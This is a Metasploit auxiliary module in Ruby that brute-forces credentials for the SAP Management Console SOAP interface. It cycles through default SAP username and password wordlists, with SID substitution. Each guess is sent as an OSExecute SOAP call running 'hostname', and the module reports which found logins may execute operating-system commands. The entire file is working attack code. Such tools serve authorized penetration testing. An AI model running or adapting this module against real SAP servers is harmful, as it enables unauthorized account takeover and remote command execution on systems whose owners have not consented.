##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::AuthBrute

	def initialize
		super(
			'Name'           => 'SAP Management Console Brute Force',
			'Version'        => '$Revision$',
			'Description'    => %q{ This module simply attempts to brute force the username | password for the SAP Management Console SOAP Interface. },
			'References'     =>
				[
					# General
					[ 'URL', 'http://blog.c22.cc' ]
				],
			'Author'         => [ 'Chris John Riley' ],
			'License'        => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(50013),
				OptString.new('SAP_SID', [false, 'Input SAP SID to attempt brute-forcing standard SAP accounts ', '']),
				OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request",
				'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
			], self.class)
		register_autofilter_ports([ 50013 ])
	end

	def run_host(ip)
		res = send_request_cgi({
			'uri'     => "/#{datastore['URI']}",
			'method'  => 'GET',
			'headers' =>
				{
					'User-Agent' => datastore['UserAgent']
				}
		}, 25)
		return if not res

		if datastore['SAP_SID']
			if datastore['USER_FILE']
				print_status("SAPSID set to '#{datastore['SAP_SID']}' - Using provided wordlist without modification")
			else
				print_status("SAPSID set to '#{datastore['SAP_SID']}' - Setting default SAP wordlist")
				datastore['USER_FILE'] = '/opt/metasploit3/msf3/data/wordlists/sap_common.txt'
			end
		end

		each_user_pass do |user, pass|
			enum_user(user,pass)
		end

	end

	def enum_user(user, pass)
		if datastore['USER_FILE'] == '/opt/metasploit3/msf3/data/wordlists/sap_common.txt' and datastore['SAP_SID']
			user = user.gsub("<SAPSID>", datastore["SAP_SID"].downcase)
			pass = pass.gsub("<SAPSID>", datastore["SAP_SID"])
		end

		verbose = datastore['VERBOSE']
		print_status("#{rhost}:#{rport} - Trying username:'#{user}' password:'#{pass}'")
		success = false

		soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
		xsi = 'http://www.w3.org/2001/XMLSchema-instance'
		xs = 'http://www.w3.org/2001/XMLSchema'
		sapsess = 'http://www.sap.com/webas/630/soap/features/session/'
		ns1 = 'ns1:OSExecute'

		data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi + '" xmlns:xs="' + xs + '">' + "\r\n"
		data << '<SOAP-ENV:Header>' + "\r\n"
		data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
		data << '<enableSession>true</enableSession>' + "\r\n"
		data << '</sapsess:Session>' + "\r\n"
		data << '</SOAP-ENV:Header>' + "\r\n"
		data << '<SOAP-ENV:Body>' + "\r\n"
		data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"><command>hostname</command><async>0</async></' + ns1 + '>' + "\r\n"
		data << '</SOAP-ENV:Body>' + "\r\n"
		data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"

		user_pass = Rex::Text.encode_base64(user + ":" + pass)

		begin
			res = send_request_raw({
				'uri'      => "/#{datastore['URI']}",
				'method'   => 'POST',
				'data'     => data,
				'headers'  =>
					{
						'Content-Length' => data.length,
						'SOAPAction'     => '""',
						'Content-Type'   => 'text/xml; charset=UTF-8',
						'Authorization'  => 'Basic ' + user_pass
					}
			}, 45)

			if (res.code != 500 and res.code != 200)
				return
			else
				body = res.body
				if body.match(/Invalid Credentials/i)
					success = false
				else
					success = true
					if body.match(/Permission denied/i)
						permission = false
					end

					if body.match(/OSExecuteResponse/i)
						permission = true
					end
				end
			end

		rescue ::Rex::ConnectionError
			print_error("[SAP #{rhost}] Unable to attempt authentication")
			return
		end

		if success
			print_good("[SAP Management Console] Successful login '#{user}' password: '#{pass}'")

			if permission
				vprint_good("[SAP Management Console] Login '#{user}' authorized to perform OSExecute calls")
			else
				vprint_error("[SAP Management Console] Login '#{user}' NOT authorized to perform OSExecute calls")
			end

			report_auth_info(
				:host => rhost,
				:proto => 'tcp',
				:sname => 'sap-managementconsole',
				:user => user,
				:pass => pass,
				:target_host => rhost,
				:target_port => rport
			)
			return :next_user
		else
			vprint_error("[SAP Management Console] failed to login as '#{user}' password: '#{pass}'")
			return
		end
	end
end